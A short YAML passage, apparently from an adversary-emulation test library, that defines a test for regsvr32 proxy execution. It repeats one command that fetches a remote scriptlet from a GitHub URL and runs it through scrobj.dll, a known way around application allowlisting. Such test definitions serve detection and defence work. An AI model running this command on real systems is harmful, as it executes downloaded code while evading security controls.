      cmd:
        command: |
          regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct scrobj.dll

  executors:
  - name: command_prompt
    command: |
      regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct scrobj.dll

- id: 2d8f9e6b-1a5c-438d-8b9a-674e2c1b50f3
